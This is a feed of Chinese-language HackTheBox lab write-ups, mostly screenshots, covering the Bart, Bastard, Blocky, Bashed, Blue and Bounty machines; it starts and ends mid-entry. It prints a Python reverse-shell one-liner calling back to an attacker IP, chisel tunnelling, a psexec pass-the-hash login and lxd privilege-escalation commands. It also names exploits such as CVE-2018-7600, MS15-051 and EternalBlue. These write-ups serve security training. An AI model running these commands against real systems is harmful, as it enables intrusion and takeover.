                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.587boxni53g0.webp"
                     
                ></p>
<p>记录User-Agent头信息，这样是不是就可以写一个webshell进去</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.18iinrf96l34.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.5n6pky8kggw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.ifyjfxyniy0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.5gyb78rstm00.webp"
                     
                ></p>
<p>反弹个shell回来</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.24svw4r0ie2o.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.200a0xxbp6hs.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.3vs490fvhp00.webp"
                     
                ></p>
<p>win10专业版64位系统，没有打补丁</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.mfwwb81g19s.webp"
                     
                ></p>
<p>权限不够</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.1vxylg61j740.webp"
                     
                ></p>
<p>检测工具没有检测出可利用exp，换一个</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.3ush2fed4iq0.webp"
                     
                ></p>
<p>发现一个账号密码，evil-winrm不能直接登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.4078hpycnso0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.6b9zc3mu9f80.webp"
                     
                ></p>
<p>这里开放了445，但扫描没有扫到，chisel映射一下</p>
<p><code>C:\Users\Public\chisel.exe client 10.10.14.12:6666 R:127.0.0.1:445:127.0.0.1:445</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.3tabhaa2x5g0.webp"
                     
                ></p>
<p><code>./chisel_1.8.1_linux_amd64 server --port 6666 --reverse</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.7jew8684bzg0.webp"
                     
                ></p>
<p>psexec.py登录</p>
<p><code>python psexec.py administrator:3130438f31186fbaf962f407711faddb@127.0.0.1</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.26qhzxwuj5xc.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.2t8d6ua6gqw0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Bastard - HackTheBox</title>
    <url>/post/018e0822dc20/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.5ozhzwi5h2o0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.1gdsruyldon4.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.3f20du91a600.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.kate6vlmsdc.webp"
                     
                ></p>
<p>访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.7yg573bpcjo.webp"
                     
                ></p>
<p>好眼熟啊，貌似这个cms是drupal，但不确定版本</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.4mf24gsfsfc0.webp"
                     
                ></p>
<p>robots文件看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.39zgi3txwh00.webp"
                     
                ></p>
<p>change.log文件确定了版本，搜一下exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.2d25cra5eb0g.webp"
                     
                ></p>
<p>版本范围符合</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.1sr5gy41e83k.webp"
                     
                ></p>
<p><code>https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7600.py</code></p>
<p>利用exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.6h6yj4gbsj00.webp"
                     
                ></p>
<p>反弹shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.13pwsklfyr4w.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.46wo3ug0lte0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.4imaj2voyww0.webp"
                     
                ></p>
<p>最终确定MS15-051有效</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.dyvejp0xjuw.webp"
                     
                ></p>
<p><code>https://github.com/rayhan0x01/reverse-shell-able-exploit-pocs/blob/master/ms15-051.md</code></p>
<p>老样子，msf生成一个反弹后门，用MS15-015运行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.61s7o1rfho00.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.2nfx1ujf90a0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.2ub29bcsgeu0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.4g1myok3z3q0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Blocky - HackTheBox</title>
    <url>/post/c1cc1ff33f67/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.6k0rr6v5eww0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.6zmlu4znvgs0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.2pzoprf4hk80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.5l2efpdfmv00.webp"
                     
                ></p>
<p>这端口有点意思，还开了个Minecraft服务器在上面</p>
<p>80端口扫出个域名，添加到hosts文件，访问</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.64vkq80sgcw0.webp"
                     
                ></p>
<p>逛了一圈，没啥可利用信息，扫目录</p>
<p><code>gobuster dir -u &quot;http://blocky.htb/&quot; -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,sh,pl -t 30</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.5xgu4htrj0w0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.224opsp2jkkg.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.1b0t5j92wv5s.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.77xg0iie3rk0.webp"
                     
                ></p>
<p>这目录扫起来都断断续续的，看样子应该是个wordpress站点</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.7acvpm6zat00.webp"
                     
                ></p>
<p>在这发现俩jar包文件，下载下来，unzip解压后，在利用jad进行反编译</p>
<p><code>https://github.com/moparisthebest/jad/blob/master/jad158e.linux.static.zip</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.5n07mqep9q40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.2ydobmwskg60.webp"
                     
                ></p>
<p>发现疑似数据库账号密码，扫目录发现个phpmyadmin，尝试登陆一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.3vv2laitu480.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.4ishugvfdms0.webp"
                     
                ></p>
<p>发现账号和加密后的密码，无法解密</p>
<p>Windows的phpmyadmin提权我会，Linux的怎么个操作</p>
<p>搜了半天，貌似是说这个数据库root的密码，同样也是ssh连接notch用户的密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.4kq0eo3jkya0.webp"
                     
                ></p>
<p>看到这个lxd用户组，我就知道这把稳了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.6b2skm8yf0w0.webp"
                     
                ></p>
<p>文件都存在，老样子，lxd容器提权</p>
<p><code>wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine</code></p>
<p>下载build-alpine，还是下载不下来，将内容复制，写入文本，在本地运行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.48inxr2tuf60.webp"
                     
                ></p>
<p>让靶机下载</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.1m8wmaz5j2n4.webp"
                     
                ></p>
<p><code>lxc image import alpine-v3.17-x86_64-20230401_1205.tar.gz --alias test1</code></p>
<p><code>lxc image list</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.690y1ltaokw0.webp"
                     
                ></p>
<p><code>lxc init test1 test1 -c security.privileged=true</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.7qv79yp24yg.webp"
                     
                ></p>
<p><code>lxc config device add test1 test1 disk source=/ path=/mnt/root recursive=true</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.4rmms9ynwqs0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.191pvl1ht5j4.webp"
                     
                ></p>
<hr>
<p>应该还有其他方法提权，脚本检测一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.3kbcuma5y2q0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.1vp3kluyz0e8.webp"
                     
                ></p>
<p>pkexec和脏牛就不试了，而且这靶机也没有gcc</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.7az4tbuzuno0.webp"
                     
                ></p>
<p>我们之前有notch用户的密码，sudo -l看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.3du6zoglfjo0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blocky/image.46mfgh115l40.webp"
                     
                ></p>
<p>还有其他提权方法，不一个一个试了，主要是lxd那块太慢了，浪费时间</p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Bashed - HackTheBox</title>
    <url>/post/07986bdc7b27/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.71qwzdu0yao0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.1alucwvwajs0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.22y11dshdav4.webp"
                     
                ></p>
<p>只开放了80端口，访问</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.6zr1ck4pdf00.webp"
                     
                ></p>
<p>搜索一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.2msz4vaqq8u0.webp"
                     
                ></p>
<p>这么简单？</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.529ui67vuvs.webp"
                     
                ></p>
<p>扫一下目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.6lran4l5fm80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.4gbhfm75ekq0.webp"
                     
                ></p>
<p>在dev目录下发现bash</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.jfzwgpkiq5c.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.4js511wpw7i0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.6x7nv2zfvtk0.webp"
                     
                ></p>
<p>想办法把shell反弹回来</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.621gvbs630k0.webp"
                     
                ></p>
<p>不能直接反弹</p>
<p>在本地写一个python反弹文件，在让他下载执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;10.10.14.19&quot;,7776)); os.dup2(s.fileno(),0);  os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.2j518ca4hlu0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.2otxreay7oo0.webp"
                     
                ></p>
<p>看看有没有可以利用的</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.3giosuax2h60.webp"
                     
                ></p>
<p>发现一个scriptmanager用户，sudo -u scriptmanager bash -i切换过去</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.364179m6ygo0.webp"
                     
                ></p>
<p>在根目录下有一个scripts文件夹</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.3ak4w2hu76w0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.6ijw8ywyvtk0.webp"
                     
                ></p>
<p>执行脚本后会往test.txt文本中写入一段话，尝试删除test.txt</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.2l4m8c6anss0.webp"
                     
                ></p>
<p>发现几分钟后又创建了一个，而且所有者为root</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.6n1rqqninyo0.webp"
                     
                ></p>
<p>由此可以推断，该目录下的所有脚本，会定时被root所执行，此时只需要一个反弹的python文件即可，继续使用上面反弹所用的python命令</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.2ct38p3jsejo.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.13966zcxcwjk.webp"
                     
                ></p>
<p>监听7766</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.1orsdqfm5hsw.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.1uudmhn351cw.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Blue - HackTheBox</title>
    <url>/post/74c4d842e2fd/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.3yj2oep78c20.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.4hu4qt0nfy80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.5i2oj2rl0kg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.2sa036eumyw0.webp"
                     
                ></p>
<p>win7系统，扫一下445</p>
<p><code>nmap -n -v -p 445 --script=smb-vuln* 10.10.10.40 -Pn</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.1kq5ri8zep40.webp"
                     
                ></p>
<p>永恒之蓝，老样子，msf梭哈</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.55h5mevmz7c0.webp"
                     
                ></p>
<p>用第二个</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.4rbweuvxt1g0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.1q5pjoapeo1s.webp"
                     
                ></p>
<p>直接system权限了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.1d4fhik254zk.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Blue/image.5wcd91wjjhc0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Bounty - HackTheBox</title>
    <url>/post/3e2d99936965/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.7031sweua540.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.503ywvb5xu40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.691qehbhng40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.2hjfkvefdls0.webp"
                     
                ></p>
<p>访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.6emi1y07gds0.webp"
                     
                ></p>
<p>扫下目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.3kbcky1o52m.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.5xgceg5n0to0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.69y4lygcdhw0.webp"
                     
                ></p>
<p>一个上传点，一个上传后的保存目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.6c3842snrmo0.webp"
                     
                ></p>
<p>无法直接上传asp，aspx的文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.16rp4zvsjrgg.webp"
                     
                ></p>
<p>测试后，发现可以上传.config文件</p>
<p>在iis和asp搭建的站点中，存在一个web.config的文件，功能类似于php站点的.htaccess文件，可以制作一个具有远程代码执行的web.config文件上传上去</p>
<p><code>https://soroush.secproject.com/blog/tag/file-upload-bypass/</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.6sm1o5obshk0.webp"
                     
                ></p>
<p>这个文件上传之后如果执行，则会触发1+2，会输出3</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.36jampsziho0.webp"
                     
                ></p>
<p>修改一下，让其执行一个反弹shell</p>
<p><code>https://github.com/cym13/vbs-reverse-shell/blob/master/reverse_shell.vbs</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.59qd6k759rw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.14swhvhcuqf4.webp"
                     
                ></p>
<p>将这两句添加至web.config中</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.5gbgtvhe3k00.webp"
                     
                ></p>
<p>并将执行的命令修改为powershell反弹命令，上传并访问触发后，就会远程加载反弹shell的ps文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.1nve69bfsuf4.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.71y079abi7w0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.2dgpyxw9zvms.webp"
                     
                ></p>
<p>筛选出可使用的提权方法为MS10-092，MS15-015，选择MS15-015，主要是方便</p>
<p>将MS15-015上传到靶机，并msf生成一个反弹shell后门，也一起上传到靶机</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.13d3zcua1apc.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.7inbpjzau400.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.iu1fkvdt368.webp"
                     
